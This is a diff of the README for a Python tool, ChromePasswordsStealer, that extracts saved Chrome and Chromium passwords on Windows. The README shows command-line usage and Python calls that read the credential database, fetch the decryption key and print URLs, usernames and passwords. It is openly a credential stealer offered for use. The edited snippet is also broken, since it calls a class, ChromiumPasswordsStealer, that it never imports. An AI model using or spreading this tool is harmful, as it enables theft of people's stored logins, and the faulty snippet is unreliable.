@@ -4,7 +4,7 @@
 
 ## Description
 
-This module steals chrome passwords on Windows.
+This module steals chrome and chromium passwords on Windows.
 
 ## Requirements
 
@@ -44,7 +44,7 @@ ChromeStealer --save-all --window -f passwords
 ```python
 from ChromePasswordsStealer import ChromePasswordsStealer
 stealer = ChromePasswordsStealer()
-stealer = ChromePasswordsStealer("passwords", True)
+stealer = ChromiumPasswordsStealer("passwords", True)
 stealer.get_database_cursor()
 stealer.get_key()
 for url, username, password in stealer.get_credentials():
